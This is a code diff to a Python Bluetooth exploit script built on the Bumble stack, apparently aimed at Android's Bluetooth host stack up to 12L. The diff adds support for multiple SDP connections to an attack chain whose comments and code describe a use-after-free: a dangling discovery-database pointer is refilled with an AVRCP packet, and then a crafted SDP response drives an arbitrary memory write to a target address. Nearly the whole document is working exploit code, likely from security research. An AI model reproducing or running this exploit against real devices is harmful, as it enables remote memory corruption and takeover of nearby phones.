@@ -2,7 +2,7 @@ import asyncio
 import struct
 
 import bumble.logging
-from bumble import core, hci, rfcomm, transport, utils, hfp, sdp, avrcp
+from bumble import core, hci, rfcomm, transport, utils, hfp, sdp, avrcp, l2cap
 from bumble.colors import color
 from bumble.device import Connection, Device, DeviceConfiguration
 from bumble.l2cap import ClassicChannelSpec
@@ -81,6 +81,8 @@ async def main():
         }
 
         requests: list[sdp.SDP_ServiceSearchAttributeRequest] = []
+        sdp_connections: list[l2cap.ClassicChannel] = []
+        multiple_sdp_connections = True  # True for Android <=12L
 
         await device.power_on()
         connection = await device.connect(
@@ -118,6 +120,8 @@ async def main():
         def my_hook(request_):
             print("got SDP, doing NOTHING", request_)
             requests.append(request_)
+            if multiple_sdp_connections:
+                sdp_connections.append(device.sdp_server.channel)
 
         device.sdp_server.orig_on_sdp_service_search_attribute_request = device.sdp_server.on_sdp_service_search_attribute_request
         device.sdp_server.on_sdp_service_search_attribute_request = my_hook
@@ -127,6 +131,7 @@ async def main():
 
         async def do_write(target_address, target_buffer):
             requests.clear()
+            sdp_connections.clear()
             channel = await rfcomm_mux.open_dlc(hfp_channel_id)
             print("open dlc!!!!!!!")
             await asyncio.sleep(0.5)
@@ -134,11 +139,14 @@ async def main():
             await asyncio.sleep(0.5)
             channel = await rfcomm_mux.open_dlc(hfp_channel_id)
             await asyncio.sleep(0.5)
-            device.sdp_server.send_response(
-                sdp.SDP_ErrorResponse(
-                    transaction_id=requests[0].transaction_id,
-                    error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
-                ))
+            sdp_response = sdp.SDP_ErrorResponse(
+                transaction_id=requests[0].transaction_id,
+                error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
+            )
+            if multiple_sdp_connections:
+                sdp_connections[0].send_pdu(sdp_response)
+            else:
+                device.sdp_server.send_response(sdp_response)
             await asyncio.sleep(0.5)
             # now p_disc_db is dangling: realloc it using avct_lcb_msg_asmbl
             # we don't control the first 0x13 bytes; with 0xef as my filler:
@@ -156,23 +164,29 @@ async def main():
 
             if len(requests) == 2 and "AudioSource" in str(requests[1]):
                 print("end audiosource")
-                device.sdp_server.send_response(
-                    sdp.SDP_ErrorResponse(
-                        transaction_id=requests[1].transaction_id,
-                        error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
-                    ))
+                sdp_response = sdp.SDP_ErrorResponse(
+                    transaction_id=requests[1].transaction_id,
+                    error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
+                )
+                if multiple_sdp_connections:
+                    sdp_connections[1].send_pdu(sdp_response)
+                else:
+                    device.sdp_server.send_response(sdp_response)
             await asyncio.sleep(0.5)
 
             # now p_disc_db is overwritten with our avrcp packet
             # send sdp response, and sdp_copy_raw_data will do arbitrary memcpy
             sdp_attribute_list = bytes(
                 sdp.DataElement.sequence([target_buffer]))
-            device.sdp_server.send_response(
-                sdp.SDP_ServiceSearchAttributeResponse(
-                    transaction_id=requests[-1].transaction_id,
-                    attribute_lists_byte_count=len(sdp_attribute_list),
-                    attribute_lists=sdp_attribute_list,
-                    continuation_state=bytes([0])))
+            sdp_response = sdp.SDP_ServiceSearchAttributeResponse(
+                transaction_id=requests[-1].transaction_id,
+                attribute_lists_byte_count=len(sdp_attribute_list),
+                attribute_lists=sdp_attribute_list,
+                continuation_state=bytes([0]))
+            if multiple_sdp_connections:
+                sdp_connections[-1].send_pdu(sdp_response)
+            else:
+                device.sdp_server.send_response(sdp_response)
             await asyncio.sleep(0.5)
             # clean up: free avrcp packet, close rfcomm channel
             avrcp_protocol.avctp_protocol.send_response(0, 0x4141, b"A")
